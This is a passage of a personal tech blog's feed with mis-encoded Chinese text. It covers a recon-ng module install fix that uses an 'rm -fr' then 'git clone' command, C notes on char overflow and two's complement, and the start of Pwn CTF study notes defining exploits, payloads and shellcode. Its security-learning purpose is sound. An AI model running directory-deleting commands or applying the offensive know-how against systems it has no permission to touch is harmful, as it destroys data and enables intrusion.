    <content type="html"><![CDATA[<h2 id="recon-ng-v5-1-1å®‰è£…æ¨¡å—"><a href="#recon-ng-v5-1-1å®‰è£…æ¨¡å—" class="headerlink" title="recon-ng v5.1.1å®‰è£…æ¨¡å—"></a>recon-ng v5.1.1å®‰è£…æ¨¡å—</h2><p><strong>é—®é¢˜ï¼š</strong>è¿›å…¥åæŠ¥ <code>[*] No modules enabled/installed.</code></p><p><strong>è§£å†³æ–¹æ³•ï¼š</strong></p><p>1ã€åœ¨ <code>recon-ng</code> æ§åˆ¶å°è¾“å…¥ <code>marketplace install all</code> ï¼Œç”¨æ¥ä¸‹è½½æ‰€æœ‰æ’ä»¶ï¼Œå¯èƒ½éœ€è¦ä»£ç†æˆ–è€…ç§‘å­¦ä¸Šç½‘ã€‚</p><p>2ã€ç›´æ¥ shell æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> rm -fr ~/.recon-ng &amp;&amp; git <span class="hljs-built_in">clone</span> https://github.com/lanmaster53/recon-ng-marketplace.git ~/.recon-ng</span><br></code></pre></td></tr></table></figure><p>å¦‚æœç½‘ç»œåŸå› è¿˜æ˜¯ä¸è¡Œï¼Œå¯ä»¥æŠŠ <code>recon-ng-marketplace</code> å¯¼å…¥åˆ°ç äº‘ä¸Šæˆ–è€…æŒ‚ä½ çš„ä»£ç†ï¼Œæˆ–è€…ç›´æ¥ä¸‹è½½zipå‹ç¼©åŒ…ï¼Œæœ€ç»ˆç›®çš„å°±æ˜¯æŠŠ <code>recon-ng-marketplace</code> å†…æ‰€æœ‰æ–‡ä»¶æ”¾åœ¨å®¶ç›®å½•ä¸‹çš„ <code>.recon-ng</code> ç›®å½•ä¸‹ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Kali</tag>
      
      <tag>recon-ng</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€æ•°æ®æº¢å‡º</title>
    <link href="/2022/02/25/Code/C/C%E8%AF%AD%E8%A8%80%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA/"/>
    <url>/2022/02/25/Code/C/C%E8%AF%AD%E8%A8%80%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€æ•°æ®æº¢å‡º"><a href="#Cè¯­è¨€æ•°æ®æº¢å‡º" class="headerlink" title="Cè¯­è¨€æ•°æ®æº¢å‡º"></a>Cè¯­è¨€æ•°æ®æº¢å‡º</h1><h2 id="charç±»å‹æº¢å‡º"><a href="#charç±»å‹æº¢å‡º" class="headerlink" title="charç±»å‹æº¢å‡º"></a>charç±»å‹æº¢å‡º</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> a = <span class="hljs-number">400</span>,b=<span class="hljs-number">-129</span>,c=<span class="hljs-number">128</span>;          <span class="hljs-comment">//char å–å€¼èŒƒå›´: -128~127</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a=%d,b=%d,c=%d\n&quot;</span>,a,b,c);   <span class="hljs-comment">//a=-112,b=127,c=-128</span><br>&#125;<br><br><span class="hljs-comment">//åŸç  -&gt; è¡¥ç  -&gt; æˆªå–8ä½,å¾—åˆ°æº¢å‡ºåçš„è¡¥ç  -&gt; åç  -&gt; åŸç  -&gt; åè¿›åˆ¶</span><br><span class="hljs-comment">/************************************</span><br><span class="hljs-comment">400åŸ = 01 1001 0000</span><br><span class="hljs-comment">400è¡¥ = 01 1001 0000</span><br><span class="hljs-comment">æº¢å‡ºå</span><br><span class="hljs-comment">400è¡¥ = 1001 0000</span><br><span class="hljs-comment">400å = 1001 0000-1 = 1000 1111</span><br><span class="hljs-comment">è½¬å˜ä¸ºåŸç å: 1111 0000</span><br><span class="hljs-comment">åè¿›åˆ¶ä¸º: -112 </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">-129åŸ = 1 1000 0001</span><br><span class="hljs-comment">-129è¡¥ = 1 0111 1111</span><br><span class="hljs-comment">æº¢å‡ºå</span><br><span class="hljs-comment">-129è¡¥ = 0111 1111</span><br><span class="hljs-comment">-129å = 0111 1111</span><br><span class="hljs-comment">è½¬å˜ä¸ºåŸç å: 0111 1111</span><br><span class="hljs-comment">åè¿›åˆ¶ä¸º: 127</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">128åŸ = 0 1000 0000</span><br><span class="hljs-comment">128è¡¥ = 0 1000 0000</span><br><span class="hljs-comment">æº¢å‡ºå</span><br><span class="hljs-comment">128è¡¥ = 1000 0000</span><br><span class="hljs-comment">åè¿›åˆ¶ä¸º: -128</span><br><span class="hljs-comment">************************************/</span><br>    <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C issue</title>
    <link href="/2022/02/19/Code/C/C-issue/"/>
    <url>/2022/02/19/Code/C/C-issue/</url>
    
    <content type="html"><![CDATA[<h1 id="C-issue"><a href="#C-issue" class="headerlink" title="C issue"></a>C issue</h1><h2 id="å¾—åˆ°æŒ‡é’ˆæŒ‡å‘çš„æ•°ç»„çš„é•¿åº¦"><a href="#å¾—åˆ°æŒ‡é’ˆæŒ‡å‘çš„æ•°ç»„çš„é•¿åº¦" class="headerlink" title="å¾—åˆ°æŒ‡é’ˆæŒ‡å‘çš„æ•°ç»„çš„é•¿åº¦"></a>å¾—åˆ°æŒ‡é’ˆæŒ‡å‘çš„æ•°ç»„çš„é•¿åº¦</h2><p>å®šä¹‰æ•°ç»„ï¼Œè¦ç»™å®šå…¶é•¿åº¦ï¼Œåœ¨å¯¹æ•°ç»„è¿›è¡Œæ“ä½œæ—¶ï¼Œå¯èƒ½éœ€è¦è®¡ç®—æ•°ç»„é•¿åº¦ï¼Œæ–¹æ³•æ˜¯ï¼šsizeof(æ•°ç»„å)/sizeof(å…ƒç´ ç±»å‹)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp">æ•°ç»„<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>]; <br><span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(a)=<span class="hljs-number">4</span>*<span class="hljs-number">4</span>=<span class="hljs-number">16</span>å­—èŠ‚ ï¼ˆ<span class="hljs-keyword">int</span>ä¸º<span class="hljs-number">4</span>ä¸ªå­—èŠ‚ï¼‰<br><span class="hljs-keyword">int</span> *p=a; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(p)=<span class="hljs-number">4</span>å­—èŠ‚<br><br>å¯¹æ•°ç»„åº”ç”¨<span class="hljs-keyword">sizeof</span>ï¼Œå¯ä»¥å¾—åˆ°æ•´ä¸ªæ•°ç»„åˆ†é…çš„å­—èŠ‚æ•°ï¼ˆå­˜å‚¨å…¨éƒ¨æ•°æ®å ç”¨çš„å†…å­˜å­—èŠ‚æ•°ï¼‰<br>å¯¹æŒ‡é’ˆåº”ç”¨<span class="hljs-keyword">sizeof</span>ï¼Œåªæ˜¯å¾—åˆ°åˆ†é…ç»™ç”¨æ¥å­˜å‚¨ä¸€ä¸ªåœ°å€å€¼çš„æŒ‡é’ˆæ‰€ç”¨çš„å­—èŠ‚æ•°ï¼Œå³<span class="hljs-number">4</span>ä¸ªå­—èŠ‚ã€‚ï¼ˆä¸Šé¢éƒ½æ˜¯åœ¨<span class="hljs-number">32</span>ä½ç¼–è¯‘ç³»ç»Ÿï¼‰<br> <br>C++ä¸­<span class="hljs-keyword">sizeof</span>å¾—åˆ°çš„æ˜¯å­—èŠ‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä½ æ‰€è¯´çš„â€œé•¿åº¦å•ä½â€<br> <br>æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦æ•°ç»„é•¿åº¦çš„è·å–æ–¹æ³•ï¼Œä¸èƒ½ç”¨<span class="hljs-keyword">sizeof</span>ï¼Œå› ä¸ºç”¨<span class="hljs-keyword">sizeof</span>ï¼ˆæŒ‡é’ˆï¼‰ï¼Œå¾—åˆ°æŒ‡é’ˆé•¿åº¦ä¸º<span class="hljs-number">4</span>ï¼Œåº”è¯¥ç”¨<span class="hljs-built_in">strlen</span>()å‡½æ•°ã€‚<br></code></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²-02xæ ¼å¼åŒ–è¾“å‡ºå‡ºç°FFFFFFè§£å†³åŠæ³•"><a href="#å­—ç¬¦ä¸²-02xæ ¼å¼åŒ–è¾“å‡ºå‡ºç°FFFFFFè§£å†³åŠæ³•" class="headerlink" title="å­—ç¬¦ä¸²%02xæ ¼å¼åŒ–è¾“å‡ºå‡ºç°FFFFFFè§£å†³åŠæ³•"></a>å­—ç¬¦ä¸²%02xæ ¼å¼åŒ–è¾“å‡ºå‡ºç°FFFFFFè§£å†³åŠæ³•</h2><p>  æœ€è¿‘åšé¡¹ç›®ï¼Œé‡åˆ°å­—ç¬¦ä¸²æ ¼%02xå¼åŒ–è¾“å‡ºå‡ºç°FFFFFFç°è±¡ï¼Œå¶å°”å‡ºç°ï¼Œå¤§éƒ¨åˆ†æ—¶é—´æ˜¯å¥½çš„ï¼Œç½‘ä¸ŠæŸ¥é˜…èµ„æ–™ï¼Œå‘ç°è§£å†³åŠæ³•ï¼š</p><pre><code>C89æ ‡å‡†è§„å®šï¼Œshortå’Œcharä¼šè¢«è‡ªåŠ¨æå‡ä¸ºintï¼ˆæ•´å½¢åŒ–ï¼Œç±»ä¼¼åœ°ï¼Œfloatä¹Ÿä¼šè‡ªåŠ¨æå‡ä¸ºdoubleï¼‰ï¼Œè¿™æ ·åšæ˜¯ä¸ºäº†ä¾¿äºç¼–è¯‘å™¨è¿›è¡Œä¼˜åŒ–ï¼Œä½¿å˜é‡çš„é•¿åº¦å°½å¯èƒ½ä¸€æ ·ï¼Œå°½å¯èƒ½æå‡æ‰€äº§ç”Ÿä»£ç çš„æ•ˆç‡ã€‚data[i]çš„å€¼å½“å®ƒæ˜¯æ­£æ•°çš„æ—¶å€™ä¹ŸåŒæ ·è¿›è¡Œäº†ç¬¦å·æ‰©å±•çš„ï¼Œåªä¸è¿‡æ­£æ•°æ˜¯å‰é¢åŠ 0ï¼Œç”¨%02xæ‰“å°çš„æ—¶å€™é‚£äº›0è¢«å¿½ç•¥ï¼›è€Œè¡¥ç è¡¨ç¤ºçš„è´Ÿæ•°çš„ç¬¦å·æ‰©å±•å´æ˜¯å‰é¢åŠ 1ï¼Œç”¨%02xæ‰“å°çš„æ—¶å€™é‚£äº›1ä¸èƒ½è¢«å¿½ç•¥ï¼Œå› æ­¤æ‰æŒ‰ç…§æœ¬æ¥çš„é•¿åº¦è¾“å‡ºæ¥ã€‚å¦‚æ²¡æœ‰æ·»åŠ unsignedï¼Œåˆ™å½“data[i]&gt;0x7Fæ—¶ï¼ˆå¦‚0X80ï¼‰ï¼Œæ ¼å¼è½¬æ¢ä¸ºFFFFFF80ï¼</code></pre><p>æ•…è®¡ç®—8ä½å¼‚æˆ–æ ¡éªŒå‡½æ•°è°ƒæ•´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> <span class="hljs-title">calc_crc</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *buff, <span class="hljs-keyword">int</span> buff_sz)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> chsum = <span class="hljs-number">0</span>, it;<br><span class="hljs-keyword">for</span>(it = <span class="hljs-number">0</span>; it &lt; buff_sz; ++it)<br>chsum ^= (<span class="hljs-keyword">int</span>)buff[it];<br><span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(chsum &amp; <span class="hljs-number">0xFF</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1000-0000-ä¸ºä»€ä¹ˆæ˜¯-128"><a href="#1000-0000-ä¸ºä»€ä¹ˆæ˜¯-128" class="headerlink" title="1000 0000 ä¸ºä»€ä¹ˆæ˜¯-128"></a>1000 0000 ä¸ºä»€ä¹ˆæ˜¯-128</h2><p>è¯•æƒ³ä¸€ä¸ªå…«ä½äºŒè¿›åˆ¶æ•°ï¼š00000000</p><p>å¦‚æœæˆ‘ä»¬å¯¹å®ƒè¿›è¡Œå‡ä¸€çš„æ“ä½œï¼Œç”¨å°å­¦çš„å‡æ³•çŸ¥è¯†ï¼Œæˆ‘ä»¬çŸ¥é“0å·ä½ï¼ˆæœ€å³è¾¹é‚£ä½ï¼‰ä¸å¤Ÿï¼Œè¦å‘1å·ä½ï¼ˆå³æ•°ç¬¬äºŒä¸ªä½ï¼‰å€Ÿï¼Œ1å·ä½ä¸å¤Ÿå†å¾€å‰å€Ÿï¼Œå€Ÿåˆ°7å·ä½å‘ç°è¿˜æ˜¯ä¸å¤Ÿï¼Œäºæ˜¯è®¡ç®—æœºåœ¨è™šæ‹Ÿçš„8å·ä½å¤„å€Ÿç»™è¿™ä¸ª00000000ä¸€ä¸ª1ï¼Œå¾—åˆ°å‡æ³•çš„ç»“æœï¼š11111111ã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬å˜´ä¸Šè¯´çš„è´Ÿä¸€ã€‚</p><p>ç„¶åï¼Œæˆ‘ä»¬å¦‚æœå†å¯¹è¿™ä¸ªè´Ÿä¸€åšå‡ä¸€çš„æ“ä½œï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿå˜æˆ11111110ï¼Œæ²¡é”™ï¼Œå°±æ˜¯è´ŸäºŒï¼Œä¾æ¬¡ç±»æ¨1000000å°±æ˜¯è´Ÿä¸€ç™¾äºŒåå…«ã€‚</p><p>ä½œè€…ï¼šæ³¢æ–¯åŸº<br>é“¾æ¥ï¼š<a href="https://www.zhihu.com/question/28685048/answer/41728110">https://www.zhihu.com/question/28685048/answer/41728110</a><br>æ¥æºï¼šçŸ¥ä¹<br>è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p><p>å¾ˆå¤šäººå¹¶ä¸ç†è§£è¡¥ç ã€‚<strong>è¡¥ç å°±æ˜¯åŒä½™å•Šã€‚</strong>1000000æ˜¯æ­£128ä½ çŸ¥é“å§ï¼Œæ­£è´Ÿ128æ¨¡256æ˜¯åŒä½™çš„ã€‚åŠ å‡ä¹˜å¯ä»¥ç›´æ¥ç®—ä¹Ÿæ˜¯åŒä½™çš„å®šç†å†³å®šçš„ï¼Œè€Œä¸æ˜¯å‡‘å‡ºæ¥çš„å·§åˆï¼Œå“ªå¯èƒ½å‡‘å‡ºè¿™ç§ä¸œè¥¿ï¼Ÿ</p><p>8ä½åªèƒ½è¡¨ç¤º256ä¸ªæ•°ï¼Œ0åˆ°255ï¼Œä½†æˆ‘è¿˜æƒ³è¡¨ç¤ºä¸€äº›è´Ÿæ•°æ€ä¹ˆåŠå‘¢ï¼Ÿå°±ç”¨ä¸è¯¥è´Ÿæ•°åŒä½™çš„æ­£æ•°æ¥è¡¨ç¤ºå‘—ã€‚-1=255ï¼Œ-2=254ï¼Œç­‰ç­‰ã€‚</p><p>å»ºè®®è„±ç¦»ç®—æ•°çš„æ€ç»´æ–¹å¼ï¼Œ<strong>è¿™å…¶å®å°±æ˜¯ä¸€ä¸ªç¯</strong>ã€‚æ¨¡ä»»ä½•ä¸€ä¸ªæ­£æ•´æ•°ï¼ˆå¦‚256ï¼‰ï¼Œå¯ä»¥æŠŠæ‰€æœ‰æ•´æ•°åˆ†ç±»ï¼Œæ¯”å¦‚æ¨¡256å¯åˆ†256ç±»ï¼Œ0 256 -256â€¦æ˜¯ä¸€ç±»ï¼ˆä½™0ç±»ï¼‰ï¼Œ1 257 -255â€¦æ˜¯ä¸€ç±»ï¼ˆä½™1ç±»ï¼‰ï¼Œç­‰ç­‰ï¼Œè¿™256ç±»å¯çœ‹ä½œç¯<img src="https://www.zhihu.com/equation?tex=Z_%7B256%7D" alt="[å…¬å¼]">çš„å…ƒç´ ï¼Œä½ çœ‹-128å’Œ128æ˜¯åŒä¸€ä¸ªç±»é‡Œçš„ï¼ˆä½™128ç±»ï¼‰ï¼Œç”¨ä¸€ä¸ªä»£è¡¨å¦ä¸€ä¸ªç½¢äº†ã€‚è¡¥ç å’Œæ™®é€šçš„unsigned integerséƒ½æ˜¯åœ¨æ¯ç±»ä¸­é€‰ä¸€ä¸ªæ•°ï¼Œunsigned integersé€‰0åˆ°255ï¼Œè¡¥ç è¡¨ç¤ºçš„æœ‰ç¬¦å·æ•´æ•°é€‰-128åˆ°127ï¼Œéƒ½æ˜¯ä¸€ä¸ªæ•°æ°å¥½å¯¹åº”ä¸€ä¸ªç±»ã€‚</p><p>å½“ä½ æ˜ç™½è¿™ä¸€åˆ‡åï¼Œè¡¥ç å°±æ˜¯é¡ºç†æˆç« çš„äº‹ã€‚</p><p>ç»ƒä¹ ï¼šè®¾è®¡ç”¨8ä½äºŒè¿›åˆ¶æ•°è¡¨ç¤º13è‡³268è¿™256ä¸ªæ•°çš„æ–¹æ¡ˆã€‚è¦æ±‚ä½œåŠ å‡ä¹˜è¿ç®—çš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥æŠŠç¼–ç å½“æ­£æ•´æ•°ç®—ï¼Œèƒ½å¾—åˆ°æ­£ç¡®ç»“æœã€‚</p><p>ä½œè€…ï¼šfhylhlasdf<br>é“¾æ¥ï¼š<a href="https://www.zhihu.com/question/28685048/answer/41735701">https://www.zhihu.com/question/28685048/answer/41735701</a><br>æ¥æºï¼šçŸ¥ä¹<br>è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p><p>è®¾æœºå™¨æ•°å­—é•¿ä¸º 8 ä½ï¼ˆå…¶ä¸­ 1 ä½ä¸ºç¬¦å·ä½ï¼‰å¯¹äºæ•´æ•°ï¼Œå½“å…¶åˆ†åˆ«ä»£è¡¨æ— ç¬¦å·æ•°ã€åŸç ã€è¡¥ç å’Œåç æ—¶ï¼Œå¯¹åº”çš„çœŸå€¼èŒƒå›´å„ä¸ºå¤šå°‘ï¼Ÿ</p><div class="table-container"><table><thead><tr><th>äºŒè¿›åˆ¶ä»£ç </th><th>æ— ç¬¦å·æ•°å¯¹åº”çš„çœŸå€¼</th><th>åŸç å¯¹åº”çš„çœŸå€¼</th><th>è¡¥ç å¯¹åº”çš„çœŸå€¼</th><th>åç å¯¹åº”çš„çœŸå€¼</th></tr></thead><tbody><tr><td>00000000</td><td>0</td><td>+0</td><td>+0ï¼Œ-0</td><td>+0</td></tr><tr><td>00000001</td><td>1</td><td>+1</td><td>+1</td><td>+1</td></tr><tr><td>00000010</td><td>2</td><td>+2</td><td>+2</td><td>+2</td></tr><tr><td>Â·Â·Â·Â·Â·Â·</td><td>Â·Â·Â·Â·Â·Â·</td><td>Â·Â·Â·Â·Â·Â·</td><td>Â·Â·Â·Â·Â·Â·</td><td>Â·Â·Â·Â·Â·Â·</td></tr><tr><td>01111111</td><td>127</td><td>+127</td><td>+127</td><td>+127</td></tr><tr><td>10000000</td><td>128</td><td>-0</td><td>-128</td><td>-127</td></tr><tr><td>10000001</td><td>129</td><td>-1</td><td>-127</td><td>-126</td></tr><tr><td>Â·Â·Â·Â·Â·Â·</td><td>Â·Â·Â·Â·Â·Â·</td><td>Â·Â·Â·Â·Â·Â·</td><td>Â·Â·Â·Â·Â·Â·</td><td>Â·Â·Â·Â·Â·Â·</td></tr><tr><td>11111101</td><td>253</td><td>-125</td><td>-3</td><td>-2</td></tr><tr><td>11111110</td><td>254</td><td>-126</td><td>-2</td><td>-1</td></tr><tr><td>11111111</td><td>255</td><td>-127</td><td>-1</td><td>-0</td></tr></tbody></table></div>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwn</title>
    <link href="/2022/01/19/CTF/Pwn/Pwn/"/>
    <url>/2022/01/19/CTF/Pwn/Pwn/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h1 id="Pwn-äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#Pwn-äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="Pwn(äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨)"></a>Pwn(äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨)</h1><blockquote><p>æ•´ç†è‡ªï¼š<a href="https://www.bilibili.com/video/BV1854y1y7Ro?spm_id_from=333.851.header_right.fav_list.click">XMCVE 2020 CTF Pwnå…¥é—¨è¯¾ç¨‹ å“”å“©å“”å“© bilibili</a></p></blockquote><h2 id="0x00-Pwnï¼Ÿ"><a href="#0x00-Pwnï¼Ÿ" class="headerlink" title="0x00 Pwnï¼Ÿ"></a>0x00 Pwnï¼Ÿ</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><ul><li>ç ´è§£ã€åˆ©ç”¨æˆåŠŸï¼ˆç¨‹åºçš„äºŒè¿›åˆ¶æ¼æ´ï¼‰</li><li>æ”»ç ´ï¼ˆè®¾å¤‡ã€æœåŠ¡å™¨ï¼‰</li><li>æ§åˆ¶ï¼ˆè®¾å¤‡ã€æœåŠ¡å™¨ï¼‰</li></ul><h3 id="ä¸€æ¬¡ç®€å•çš„hack"><a href="#ä¸€æ¬¡ç®€å•çš„hack" class="headerlink" title="ä¸€æ¬¡ç®€å•çš„hack"></a>ä¸€æ¬¡ç®€å•çš„hack</h3><ul><li><p>exploit</p><ul><li>ç”¨äºæ”»å‡»çš„è„šæœ¬ä¸æ–¹æ¡ˆ</li></ul></li><li><p>payload</p><ul><li>æ”»å‡»è½½è·ï¼Œæ˜¯ç›®æ ‡è¿›ç¨‹è¢«åŠ«æŒæ§åˆ¶æµçš„æ•°æ®</li></ul></li><li><p>shellcode</p><ul><li>è°ƒç”¨æ”»å‡»ç›®æ ‡çš„ shell çš„ä»£ç </li></ul></li></ul><h2 id="0x01-äºŒè¿›åˆ¶åŸºç¡€"><a href="#0x01-äºŒè¿›åˆ¶åŸºç¡€" class="headerlink" title="0x01 äºŒè¿›åˆ¶åŸºç¡€"></a>0x01 äºŒè¿›åˆ¶åŸºç¡€</h2><h3 id="1ã€ç¨‹åºçš„ç¼–è¯‘ä¸é“¾æ¥"><a href="#1ã€ç¨‹åºçš„ç¼–è¯‘ä¸é“¾æ¥" class="headerlink" title="1ã€ç¨‹åºçš„ç¼–è¯‘ä¸é“¾æ¥"></a>1ã€ç¨‹åºçš„ç¼–è¯‘ä¸é“¾æ¥</h3><p>ä»Cæºä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„ç”Ÿæˆè¿‡ç¨‹ï¼š</p><ul><li>ç¼–è¯‘<ul><li>ç”±Cè¯­è¨€ä»£ç ç”Ÿæˆæ±‡ç¼–ä»£ç </li></ul></li><li><p>æ±‡ç¼–</p><ul><li>ç”±æ±‡ç¼–ä»£ç ç”Ÿæˆæœºå™¨ç </li></ul></li><li><p>é“¾æ¥</p><ul><li>å°†å¤šä¸ªæœºå™¨ç çš„ç›®æ ‡æ–‡ä»¶é“¾æ¥æˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/9bb4b113fea69d8b2dddae04e1600866.png" alt="image-20211202205623782" style="zoom:67%;"></p><h3 id="2ã€Linuxä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ELF"><a href="#2ã€Linuxä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ELF" class="headerlink" title="2ã€Linuxä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ELF"></a>2ã€Linuxä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ELF</h3><p><strong>ä»€ä¹ˆæ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Ÿ</strong></p><ul><li><p>å¹¿ä¹‰ï¼šæ–‡ä»¶ä¸­çš„æ•°æ®æ˜¯å¯æ‰§è¡Œä»£ç çš„æ–‡ä»¶</p><ul><li>.outã€.exeã€.shã€.py</li></ul></li><li><p>ç‹­ä¹‰ï¼šæ–‡ä»¶ä¸­çš„æ•°æ®æ˜¯æœºå™¨ç çš„æ–‡ä»¶</p><ul><li>.outã€.exeã€.dllã€.so</li></ul></li></ul><p><strong>å¯æ‰§è¡Œæ–‡ä»¶çš„åˆ†ç±»</strong></p><ul><li><p>Windowsï¼šPEï¼ˆPortable Executableï¼‰</p><ul><li>å¯æ‰§è¡Œç¨‹åº<ul><li>.exe</li></ul></li><li>åŠ¨æ€é“¾æ¥åº“<ul><li>.dll</li></ul></li><li>é™æ€é“¾æ¥åº“<ul><li>.lib</li></ul></li></ul></li><li><p>Linuxï¼šELFï¼ˆExecutable and Linkable Formatï¼‰</p><ul><li>å¯æ‰§è¡Œç¨‹åº<ul><li>.out</li></ul></li><li>åŠ¨æ€é“¾æ¥åº“<ul><li>.so</li></ul></li><li>é™æ€é“¾æ¥åº“<ul><li>.a</li></ul></li></ul></li></ul><p><strong>ELF æ–‡ä»¶ç»“æ„ï¼š</strong></p><ul><li><p>ELFæ–‡ä»¶å¤´è¡¨ï¼ˆELF headerï¼‰</p><ul><li>è®°å½•äº†ELFæ–‡ä»¶çš„ç»„ç»‡ç»“æ„</li></ul></li><li><p>ç¨‹åºå¤´è¡¨/æ®µè¡¨ï¼ˆProgram header tableï¼‰</p><ul><li>å‘Šè¯‰ç³»ç»Ÿå¦‚ä½•åˆ›å»ºè¿›ç¨‹</li><li>ç”Ÿæˆè¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶å¿…é¡»æ‹¥æœ‰æ­¤ç»“æ„</li><li>é‡å®šä½æ–‡ä»¶ä¸ä¸€å®šéœ€è¦</li></ul></li><li><p>èŠ‚å¤´è¡¨ï¼ˆSection header tableï¼‰</p><ul><li>è®°å½•äº†ELFæ–‡ä»¶çš„èŠ‚åŒºä¿¡æ¯</li><li>ç”¨äºé“¾æ¥çš„ç›®æ ‡æ–‡ä»¶å¿…é¡»æ‹¥æœ‰æ­¤ç»“æ„</li><li>å…¶å®ƒç±»å‹ç›®æ ‡æ–‡ä»¶ä¸ä¸€å®šéœ€è¦</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/c5dfe3a8c7ac1d28a4499b8d887e94cb.png" alt="image-20211202205758815" style="zoom:67%;"></p><h3 id="3ã€è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´"><a href="#3ã€è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´" class="headerlink" title="3ã€è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´"></a>3ã€è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´</h3><p>åœ°å€ä»¥å­—èŠ‚ç¼–ç ï¼ˆ1 Byte = 8 bitsï¼‰ï¼Œå¸¸ä»¥16è¿›åˆ¶è¡¨ç¤ºï¼ˆ0x3c = 0011 1100ï¼‰ 